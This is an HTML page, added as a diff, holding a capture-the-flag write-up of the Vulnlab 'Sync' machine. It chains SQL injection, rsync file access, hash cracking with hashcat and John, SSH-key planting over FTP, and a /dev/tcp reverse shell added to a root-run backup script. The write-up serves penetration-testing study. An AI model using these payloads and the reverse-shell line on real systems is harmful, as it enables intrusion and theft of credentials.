@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Write-Ups</title>
+    <link rel="stylesheet" href="style.css">
+    <script defer src="script.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="navbar">
+            <ul class="nav-links">
+                <li><a href="index.html"><i class="fas fa-home"></i> Home</a></li>
+                <li><a href="Write-up.html"><i class="fas fa-file-alt"></i> Write-Ups</a></li>
+                <li><a href="#redteam"><i class="fas fa-user-secret"></i> Red Team</a></li>
+            </ul>
+        </div>
+        <div class="contents">
+            <h1>Sync Write-up</h1>
+            <div class="big-to-normal-image">
+                <img src="images/Sync.png" alt="Sync Write-up">
+            </div>
+            <p>This Vulnlab box starts by exploiting an old protocol, rsync, which exposed a directory we could download. Inside, we discovered a user’s hashed password along with the method used to generate it. Using this information, we successfully cracked the hash and obtained valid credentials.</p>
+            <p>With these credentials, we logged into an FTP server, which provided access to the user’s home directory. Notably, the user had read, write, and modify permissions, allowing us to create an SSH directory and upload our own public SSH key. This enabled us to log in as the user via SSH.</p>
+            <p>Upon enumeration, we found two additional user accounts on the system. One of these users had reused the same password, allowing us to escalate access to the second account. we discovered multiple backup zip files, which we transferred to our local machine. Extracting the contents revealed both the shadow and passwd files, allowing us to crack additional password hashes using John the Ripper.</p>
+            <p>With access to the final user, we identified a root-owned script that executed every minute or two. Since we had write permissions to this script, we modified it to include a reverse shell, successfully gaining root access and fully compromising the machine.</p>
+            <h2>Enumeration</h2>
+            <h3>Nmap Scan</h3>
+            <div class="snippet">
+                <pre class="code-block">
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 20:29 PST
+Nmap scan report for 10.10.64.141
+Host is up (0.17s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT    STATE SERVICE VERSION
+21/tcp  open  ftp     vsftpd 3.0.5
+22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c7:2d:7d:88:89:83:57:48:62:1e:6d:f4:e0:da:e5:96 (ECDSA)
+|_  256 22:e0:79:8a:31:1f:9d:fd:bc:2c:39:52:78:41:df:83 (ED25519)
+80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Login
+873/tcp open  rsync   (protocol version 31)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.01 seconds
+                </pre>
+            </div>
+            <p>There are three ports open. Viewing port 80 shows us an login page.</p>
+            <h3>Port 80</h3>
+            <img src="images/Sync-port-80.png" alt="Sync Port 80">
+            <p>This is vulnerable to SQLi which we can bypass the login propt and log in as admin.</p>
+            <div class="snippet">
+                <pre class="code-block">
+admin' or '1'='1
+                </pre>
+            </div>
+            <div class="big-to-normal-image">
+                <img src="images/Sync-SQLi.png" alt="Sync SQLi">
+                <img src="images/Sync-SQLi-admin.png" alt="Sync SQLI As Admin">
+            </div>
+            <p>There was not much for us here so moving onto rsync</p>
+            <h3>Rsync port 873</h3>
+            <p>Rsync is utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers by comparing the modification times and sizes of files. A default port is 873.</p>
+            <p>We can view if there is any folders available for us to view.</p>
+            <div class="snippet">
+                <pre class="code-block">
+rsync -av --list-only rsync://10.10.88.10                    
+                </pre>
+            </div>
+            <img src="images/Sync-Rsync.png" alt="Sync Rsync Enumeration">
+            <p>This shows there is a folder that we can view. Now lets mount the folder onto our machine.</p>
+            <div class="snippet">
+                <pre class="code-block">
+# First make a directory to mount the folder to
+mkdir httpd
+
+# mount the folder to the specifiec directory
+rsync -av rsync://10.10.88.10:873/httpd httpd
+                </pre>
+            </div>
+            <div class="big-to-normal-image">
+                <img src="images/Sync-Rsync-file.png" alt="Sync Rsync File Download">
+            </div>
+            <p>Inside the <code>db</code> shows a sql file which we can open with sqlitebrowser.</p>
+            <p>It shows us the username and their password hashes. Trying to crack with hashcat failed for both hashes. Viewing the <code>www</code> directory and outputting the contexts of index.php will show us how the hash is created. I will walk through this.</p>
+            <div class="big-to-normal-image">
+                <img src="images/Sync-Sql-DB.png" alt="Sync SQL DB">
+            </div>
+            <img src="images/Sync-Website-config.png" alt="Sync Index PHP file">
+            <ol>
+                <li><code>$secure</code> – This acts as the <code>salt</code> in the hashing process.</li>
+                <li><code>$hash</code> – The final hash is generated using <code>MD5</code>, which takes the combination of:</li>
+                <ul>
+                    <li><code>md5($secure . $username . "|" . $password . "|")</code></li>
+                    <li>Here, <code>|</code> (pipe character) is explicitly included in the hashing process.</li>
+                </ul>
+            </ol>
+            <h2>Understanding the Hash Format:</h2>
+            <p>With this understanding, the stored hash follows the format: <code>hash:salt|username|</code></p>
+            <ol>
+                <li><code>hash</code> = The final MD5 output.</li>
+                <li><code>salt</code> = The <code>$secure</code> value.</li>
+                <li><code>username</code> = The username (which is also concatenated as part of the hashing process).</li>
+            </ol>
+            <p>The reason we include the pipe <code>(`|`)</code> is because it was also part of the input string being hashed in <code>md5()</code>. This ensures that when cracking the hash with <code>Hashcat</code>, the format is correct.</p>
+            <p>This is the format that hashcat also needs. With that being said we have the correct hash format for hashcat to crack</p>
+            <div class="snippet">
+                <pre class="code-block">
+hashcat -m 20 -a 0 hash ../SecLists/Passwords/Leaked-Databases/rockyou.txt
+                </pre>
+            </div>
+            <p>That will crack the hash for triss. I was unable to log into ssh as triss however I was able to log into ftp as triss.</p>
+            <h2>User as triss</h2>
+            <p>Logging in as triss shows this is most likely triss home directory</p>
+            <img src="images/Sync-FTP-login.png" alt="Sync FTP Login">
+            <p>We can modify and create directories and upload files to this directory. We can upload a ssh key and log in as triss. First make a <code>.ssh</code> directory</p>
+            <img src="images/Sync-FTP-ssh.png" alt="Sync FTP SSH">
+            <p>On our machine we will create a ssh key.</p>
+            <img src="images/Sync-SSH-Gen.png" alt="Sync SSH Gen">
+            <p>Now lets make a file called authorized_keys on our machine.</p>
+            <div class="snippet">
+                <pre class="code-block">
+touch authorized_keys
+                </pre>
+            </div>
+            <p>Then cat out the public key and echo into the authorized_keys file</p>
+            <div class="snippet">
+                <pre class="code-block">
+cat id_rsa.pub
+
+echo "from id_rsa.pub output" > authorized_keys
+                </pre>
+            </div>
+            <p>Now on ftp cd into .ssh and upload authorized_keys</p>
+            <div class="snippet">
+                <pre class="code-block">
+put authorized_keys
+                </pre>
+            </div>
+            <div class="big-to-normal-image">
+                <img src="images/Sync-SSH-Upload.png" alt="Sync SSH Upload">
+                <p>Now we can ssh as triss</p>
+                <img src="images/Sync-SSH-Triss.png" alt="Sync SSH As Triss">
+            </div>
+            <h2>User As Jennifer</h2>
+            <p>In the <code>/home</code> directory there are two other users, jennifer and sa. We can try to do password re-use on the new users we found which Jennifer was using the same password as triss.</p>
+            <div class="big-to-normal-image">
+                <img src="images/Sync-User-As-Jennifer.png" alt="Sync User As Jennifer">
+            </div>
+            <p>Running linpeas shows there is a directory we can access that is owned by root.</p>
+            <div class="big-to-normal-image">
+                <img src="images/Sync-Backup-Dir.png" alt="Sync BackUp Dir">
+                <img src="images/Sync-BackUp-Files.png" alt="Sync Backup Files">
+            </div>
+            <h2>User As SA</h2>
+            <p>There is a-lot of zip files that seems like its a backup of a sort. we can transfer all the files onto our machine.</p>
+            <p>Viewing the output we will download the latest backup zip file which is <code>1738125721.zip</code>. Unzipping the file shows us the <code>/etc/passwd</code> and <code>/etc/shadow</code> files which we can try to crack the hashes.</p>
+            <div class="big-to-normal-image">
+                <img src="images/Sync-PWD.png" alt="Sync PWD File">
+            </div>
+            <div class="snippet">
+                <pre class="code-block">
+unshadow tmp/backup/passwd tmp/backup/shadow > unshadow.txt
+                </pre>
+            </div>
+            <p>then use john to crack the hashes.</p>
+            <div class="snippet">
+                <pre class="code-block">
+john --format=crypt --wordlist=/home/pixelrazer/SecLists/Passwords/Leaked-Databases/rockyou.txt unshadow.txt
+                </pre>
+            </div>
+            <p>We are able to crack <code>sa</code> password. Lets login as sa.</p>
+            <div class="big-to-normal-image">
+                <img src="images/Sync-User-As-SA.png" alt="Sync User As SA">
+            </div>
+            <h2>Privilege Escalation</h2>
+            <p>Viewing linpeas will show the user <code>sa</code> owns a script</p>
+            <div class="big-to-normal-image">
+                <img src="images/Sync-SA-Script.png">
+            </div>
+            <p>Viewing the contents shows us its backup files as shown in the <code>/backup</code> directory. We can assume root user is running the script since its backing up the <code>/etc/shadow</code> file which the <code>sa</code> user does not have the permissions and we can also use pspy to view its being executed.</p>
+            <div class="big-to-normal-image">
+                <img src="images/Sync-BackUp-Script.png" alt="Sync BackUp Script">
+                <img src="images/Sync-Pspy-Output.png" alt="Sync PSPY Output">
+            </div>
+            <p>editing the file we can add a reverse shell.</p>
+            <div class="snippet">
+                <pre class="code-block">
+0<&196;exec 196<>/dev/tcp/10.8.5.55/4444; sh <&196 >&196 2>&196
+                </pre>
+            </div>
+            <div class="big-to-normal-image">
+                <img src="images/Sync-Root-User.png">
+            </div>
+            <h2>Conclusion</h2>
+            <p>In conclusion, the "Sync" challenge demonstrates how a series of misconfigurations—from an exposed rsync service and weak password hashing to SQL injection and insecure file permissions—can be chained together to fully compromise a system. This case underscores the importance of using up-to-date protocols, enforcing strong authentication, and maintaining strict control over critical scripts to prevent such cascading vulnerabilities.</p>
+        </div>
+    </div>
+</body>
+</html>
